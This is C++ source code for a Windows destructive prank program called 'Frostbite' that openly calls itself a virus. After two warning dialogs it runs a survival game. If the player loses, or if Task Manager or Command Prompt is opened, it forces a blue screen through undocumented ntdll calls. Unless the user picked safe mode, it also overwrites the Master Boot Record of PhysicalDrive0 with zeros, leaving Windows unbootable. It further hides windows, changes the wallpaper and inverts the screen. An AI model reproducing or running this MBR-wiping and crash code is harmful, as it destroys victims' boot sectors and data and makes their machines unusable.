#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <direct.h>
#include <Windows.h>
#include <SDL2/SDL.h>
#include <SDL2/SDL_image.h>
#include <SDL2/SDL_ttf.h>
#include <SDL2/SDL_mixer.h>

#include "Window.hpp"
#include "Entity.hpp"

#define MBR_SIZE 512
#define bzero(p, s) (void) memset(p, 0, s)

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

using namespace std;

bool overwriteMBR() {
    DWORD write;
    char mbrData[MBR_SIZE];
    bzero(&mbrData, MBR_SIZE);
    HANDLE MBR = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL
    );
    if (WriteFile(MBR, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
        return true;
    }
    else {
        return false;
    }

    CloseHandle(MBR);
}

void createEffects() {
    HDC hdc = GetDC(0);
    int x = SM_CXSCREEN;
    int y = SM_CYSCREEN;
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCINVERT);
}

typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(
        ULONG privilege,
        BOOLEAN enable,
        BOOLEAN current_thread,
        PBOOLEAN enabled);

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(
        NTSTATUS error_status,
        ULONG number_of_parameters,
        ULONG unicode_string_parameter_mask,
        PULONG_PTR parameters,
        ULONG response_option,
        PULONG reponse);

void triggerBSOD() {
    auto ntdll = LoadLibraryA("ntdll.dll");
    auto RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege) GetProcAddress(ntdll, "RtlAdjustPrivilege");
    BOOLEAN enabled;

    if (RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) == 0) {
        auto NtRaiseHardError = (pdef_NtRaiseHardError) GetProcAddress(ntdll, "NtRaiseHardError");
        ULONG response;
        NtRaiseHardError((NTSTATUS) 0xC0000002, 0, 0, nullptr, OPTION_SHUTDOWN, &response);
    }
}

int main(int argv, char** args) {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    // WARNING SECTION
    createEffects();
    int warning1 = MessageBoxW (

	NULL,
	(LPCWSTR)L"Are you sure, that you want to run Frostbite? It is recommended to run this on a virtual machine (VM). I will not be responsible for any damages. Pressing \"NO\" now, will terminate this program.", //content
	(LPCWSTR)L"Are You Sure?", //title
  	MB_ICONWARNING | MB_YESNO
    
    );

    switch (warning1) {
        case IDNO:
            return -1;
    }

    createEffects();
    int warning2 = MessageBoxW (

	NULL,
	(LPCWSTR)L"This is your second warning.", //content
	(LPCWSTR)L"Are You Sure?", //title
  	MB_ICONWARNING | MB_YESNO

    );

    switch (warning2) {
        case IDNO:
            return -1;
    }

    int mode = MessageBoxW (

	NULL,
	(LPCWSTR)L"Would you like to activate the Safe Mode of Frostbite (Safe mode will not damage your computer) ? Pressing \"NO\" will run Frostbite and make Windows unbootable.", //content
	(LPCWSTR)L"Modes", //title
  	MB_ICONWARNING | MB_YESNO

    );

    bool safeMode = true;

    switch (mode) {
        case IDNO:
            safeMode = false;
    }

    //WARNING SECTION END

    //PAYLOAD SECTION
    std::string newBG = "res/bg.png";
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID*)newBG.c_str(), SPIF_SENDCHANGE);

    bool survived = true;
    bool running = true;

    int currentTemp = 95; //MEASURED IN Fahrenheit
    int deathTemp = 56;

    int time = 0;
    int lastTime = 0;
    int difference = 5000;

	if (SDL_Init(SDL_INIT_VIDEO) > 0) {
        int mode = MessageBoxW (

	    NULL,
	    (LPCWSTR)L"The virus cannot run because of some error. Your computer isn't doomed...", //content
	    (LPCWSTR)L"Phew!", //title
  	    MB_ICONERROR | MB_OK

        );
        return 0;
	}

	if (!(IMG_Init(IMG_INIT_PNG))) {
        int mode = MessageBoxW (

	    NULL,
	    (LPCWSTR)L"The virus cannot run because of some error. Your computer isn't doomed...", //content
	    (LPCWSTR)L"Phew!", //title
  	    MB_ICONERROR | MB_OK

        );
        return 0;
	}

	if (TTF_Init() < 0) {
        int mode = MessageBoxW (

	    NULL,
	    (LPCWSTR)L"The virus cannot run because of some error. Your computer isn't doomed...", //content
	    (LPCWSTR)L"Phew!", //title
  	    MB_ICONERROR | MB_OK

        );
        return 0;
	}

    int audio_rate = 22050; 
    Uint16 audio_format = AUDIO_S16SYS; 
    int audio_channels = 2; 
    int audio_buffers = 4096;

    if (Mix_OpenAudio(audio_rate, audio_format, audio_channels, audio_buffers) != 0) {    }
    
    Mix_Chunk *sound = NULL;
    sound = Mix_LoadWAV("data/sound.wav");

	Window window("YOU ARE DEAD", 400, 100);
    createEffects();

    TTF_Font *font = TTF_OpenFont("data/lucon.ttf", 25);
    SDL_Color color = { 255, 255, 255 };

    int clicks = 0;
    int lastclicks = 0;
    int clickdifference = 5;

    SDL_Event event;
    HWND hwnd;
    HWND hwnd1;
    while (running) {
        hwnd = FindWindowA(NULL, "Task Manager");
        hwnd1 = FindWindowA(NULL, "Command Prompt");

        if (hwnd1) {
            ShowWindow(hwnd, 0);

            if (safeMode == false) {
                overwriteMBR();
            }

            triggerBSOD();
        }

        if (hwnd) {
            ShowWindow(hwnd, 0);

            if (safeMode == false) {
                overwriteMBR();
            }

            triggerBSOD();
        }

        if (currentTemp == deathTemp) {
            running = false;
            survived = false;
        }

		while (SDL_PollEvent(&event)) {
			switch (event.type) {
                case SDL_QUIT:
				    running = false;
                    survived = false;
                    break;
                case SDL_MOUSEBUTTONDOWN:
                    clicks++;
                    break;
			}
		}

		window.clear();
        
		window.displayText("CURRENT TEMPERATURE: " + std::to_string(currentTemp) + "F", 0, 0, font, color);
        window.displayText("TIME: " + std::to_string(time), 0, 25, font, color);

		window.display();

        time++;

        if (time - lastTime == difference) {
            createEffects();

            lastTime = time;
            difference = difference - 50;
            currentTemp = currentTemp - 5;

            int channel;
            channel = Mix_PlayChannel(-1, sound, 0);
        }

        if (clicks - lastclicks == clickdifference) {
            clickdifference = clickdifference + 10;
            lastclicks = clicks;

            currentTemp = currentTemp + 1;
        }

        if (currentTemp <= deathTemp) {
            running = false;
            survived = false;
        }

        if (time >= 200000) {
            survived = true;
            running = false;
        }
    }

    window.cleanUp();

	TTF_CloseFont(font);
	SDL_Quit();

    //PAYLOAD SECTION END

    while (! survived) {
        createEffects();

        if (safeMode) {
            triggerBSOD();
        }
        else {
            if (! overwriteMBR()) {
                MessageBoxW (

	            NULL,
	            (LPCWSTR)L"It seems like making Windows unbootable didn't work! It seems that your computer won't be doomed. Pressing \"OK\" will terminate Frostbite.", //content
	            (LPCWSTR)L"Phew!", //title
  	            MB_ICONINFORMATION | MB_OK

                );
            }
            else {
                triggerBSOD();
            }
        }
    }

    if (survived) {
        MessageBoxW (

	    NULL,
	    (LPCWSTR)L"Great Job! You survived Frostbite. I recommend deleting Frostbite, so it does not cause more harm.", //content
	    (LPCWSTR)L"GOODBYE", //title
  	    MB_ICONINFORMATION | MB_OK

        );
    }

    return 0;
}